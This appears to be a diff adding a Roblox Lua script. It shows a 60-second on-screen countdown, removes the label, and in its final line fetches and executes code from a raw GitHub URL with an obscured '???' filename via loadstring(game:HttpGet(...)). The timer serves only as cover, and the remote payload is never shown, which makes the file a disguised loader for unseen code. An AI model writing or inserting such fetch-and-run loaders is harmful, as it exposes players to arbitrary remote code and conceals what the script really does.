@@ -1,0 +1,32 @@
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- สร้าง UI นับถอยหลัง
+local countdownGui = Instance.new("ScreenGui")
+countdownGui.Name = "CountdownTimer"
+countdownGui.Parent = playerGui
+countdownGui.ResetOnSpawn = false
+
+local countdownLabel = Instance.new("TextLabel")
+countdownLabel.Size = UDim2.new(0, 300, 0, 100)
+countdownLabel.Position = UDim2.new(0.5, -150, 0.4, 0)
+countdownLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+countdownLabel.TextColor3 = Color3.new(1, 1, 1)
+countdownLabel.Font = Enum.Font.SourceSansBold
+countdownLabel.TextSize = 40
+countdownLabel.Text = "Time left: 60"
+countdownLabel.Parent = countdownGui
+
+-- เริ่มนับถอยหลัง
+local countdown = 60
+while countdown > 0 do
+	countdownLabel.Text = "Time left: " .. countdown
+	wait(1)
+	countdown -= 1
+end
+
+-- ลบ UI เมื่อครบเวลา
+countdownGui:Destroy()
+
+-- รันสคริปต์หลังครบเวลา
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Guest1335/New/f3af9ba97cd4ff947f6e9be49b35e37e76d23888/%3F%3F%3F'))()
